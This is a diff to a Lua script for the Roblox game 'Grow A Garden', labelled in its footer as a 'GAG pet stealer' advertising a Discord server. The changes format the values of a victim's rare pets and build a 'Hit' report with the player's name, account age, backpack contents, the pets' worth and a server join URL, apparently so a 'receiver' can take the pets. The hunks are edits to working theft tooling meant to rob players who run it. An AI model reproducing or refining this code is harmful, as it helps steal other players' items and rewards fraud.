@@ -161,13 +161,21 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-    local formatted = tostring(number)
-    local k
-    while true do  
-        formatted, k = string.gsub(formatted, "^(%d+)(%d%d%d)", '%1,%2')
-        if k == 0 then break end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
     end
-    return formatted
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
 end
 
 -- Weight extraction function
@@ -248,29 +256,40 @@ local function SendJoinMessage(list, prefix)
     end
     local backpackStr = table.concat(backpackLines, "\n")
 
-    -- Remove hits section
+    -- Hits section (customize as needed)
+    local hitsStr = "All Items"
+
+    -- Game info
+    local jobId = game.JobId or "N/A"
+    local placeId = tostring(game.PlaceId or "N/A")
+
     -- Build the embed description
     local description = string.format([[
 :bust_in_silhouette: **Player Information**
-```Name: %s
+Name: %s
 Receiver: %s
 Executor: %s
-Account Age: %s days```
+Account Age: %s days
+
 :moneybag: **Total Value**
-```%s```
+%s
+
 :palm_tree: **Backpack**
-```%s```
+%s
+
+:maple_leaf: **Hits**
+%s
 
 :island: **Join with URL**
 %s
--# %s | %s
-]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrl, placeId, jobId)
+%s | %s
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, hitsStr, joinUrl, placeId, jobId)
 
     local data = {
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
-            ["color"] = FF0000, -- Green, change as you like
+            ["color"] = 3066993, -- Green, change as you like
             ["description"] = description,
             ["footer"] = {
                 ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
@@ -347,10 +366,10 @@ for _, tool in ipairs(backpack:GetChildren()) do
                 if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                     local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                     if v14 then
-                        local itemName = v14.PetType
                         local toolName = tool.Name
-                        local age = toolName:match("%[Age%s*(%d+)%]") -- This will extract the number after [Age
-                        local petAge = age or (v14.PetData and v14.PetData.Age) or "N/A"
+                        local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
+                        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                        local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
                         -- Only include rare pets and their mutated forms
                         if isRarePet(itemName) then
                             if tool:GetAttribute("Favorite") then
@@ -362,7 +381,6 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 end
                             end
                             local value = calcPetValue(v14)
-                            local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                             debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
@@ -377,7 +395,6 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 end
                             end
                             local value = calcPetValue(v14)
-                            local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                             debugPrint("Added mutated rare pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
